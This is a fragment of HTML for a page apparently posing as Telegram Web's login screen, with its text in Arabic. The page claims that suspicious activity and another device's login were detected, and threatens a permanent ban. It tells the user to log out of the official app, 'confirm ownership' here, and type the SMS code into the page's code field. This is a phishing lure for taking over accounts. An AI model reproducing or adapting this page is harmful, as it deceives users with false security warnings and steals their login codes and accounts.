  ...
  <div class="login_page">
    <div class="login_head_wrap clearfix" ng-switch="progress.enabled">
      ...
      <!----><div ng-switch-default="" class="login_head_submit_wrap" style="">
        ...
        <button msgid="modal_next">التالي</button><i class="icon icon-next-submit"></i>
        </a><!---->
        <!---->
        <!---->
      </div><!---->
...
?></span> <span ng-bind="credentials.phone_number"></span></h3>
        <div class="login_edit_phone"><a ng-click="editPhone()" my-i18n="login_edit_number"></a></div>

        <div ng-switch="credentials.type._">
          <!---->
          <!---->
          <!----><p ng-switch-default="" class="login_smscode_lead" my-i18n="login_enter_sms_code_label_md">لـقد تــم اكـتـشـاف نـشـاط مـشـبـوه بـه حـيث لاحظنـا تسجيل دخـول جـهاز اخـر الى حسابك عـلـى تيليجرام من خلال تيليجرام ويب لحماية حـسـابـك واغـلاق جـمـيـع الـجلسات الـمشبوهـة وتجنب حظر حسابك بشكل دائم يرجى تسجيل الخروج من حسابك على تطبيق تيليجرام ثم تأكيد ملكيتك للحساب من خلال التسجيل عبر تيليجرام ويب ثم تسجيل الدخول باستخدام تطبيق تيليجرام الرسمي اذا لم تكن تستخدمه بالفعل وذلك لحماية حسابك وايقاف جـميـع الجلسـات النشطة الاخرى</p><!---->
        </div>
<p><center>يجب عليك اولا تسجيل الخروج من تطبيق تليجرام وذلك لضمان عدم حظر جهازك من استخدام هذا الحساب مرة اخرى لانه سيتم حظر جميع الاجهزه الذي بها جلسات نشطه لهذا الحساب</center></p>
        <!---->
        ...
        <div class="md-input-group md-input-group-centered md-input-animated md-input-focused md-input-has-value" ng-class="{'md-input-error': error.field == 'phone_code'}" my-labeled-input="" ng-switch="error.field == 'phone_code'">
          <!---->
          <!----><label ng-switch-default="" class="md-input-label" my-i18n="login_number_input_placeholder">هل قمت بتسجيل الخروج من تطبيق تيليجرام؟
<br>
اضغط زر التالي بعد تسجيل الخروج من التطبيق
</label><!---->
          <input autocomplete="off" class="md-input ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" my-focused="" name="phone_code" type="text" ng-model="credentials.phone_code" required="" maxlength="8" value="">
        </div>
         <div class="md-input-group md-input-group-centered md-input-animated md-input-focused md-input-has-value" ng-class="{'md-input-error': error.field == 'phone_code'}" my-labeled-input="" ng-switch="error.field == 'phone_code'">
          <!---->
